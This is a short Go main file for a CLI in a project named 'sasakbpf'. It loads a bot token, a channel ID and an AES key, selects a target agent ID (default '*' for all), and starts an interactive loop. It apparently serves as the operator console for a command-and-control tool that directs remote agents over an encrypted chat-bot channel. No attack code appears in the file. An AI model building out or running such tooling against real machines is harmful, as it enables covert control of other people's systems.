package main

import (
	"context"
	"flag"
	"fmt"
	"os"

	"sasakbpf/internal/config"
	"sasakbpf/internal/repl"
)

func main() {
	targetFlag := flag.String("target", "", "target agent ID (overrides build-time SD_TARGET_ID)")
	flag.Parse()

	cfg := config.Load()
	if cfg.BotToken == "" || cfg.ChannelID == "" || cfg.AESKeyHex == "" {
		fmt.Fprintln(os.Stderr, "[cli] missing config — set SD_* env or rebuild with ldflags")
		os.Exit(2)
	}
	if *targetFlag != "" {
		cfg.TargetID = *targetFlag
	} else if cfg.TargetID == "" {
		cfg.TargetID = "*"
	}
	if cfg.Self == "" {
		cfg.Self = "cli"
	}
	if err := repl.Loop(context.Background(), cfg); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}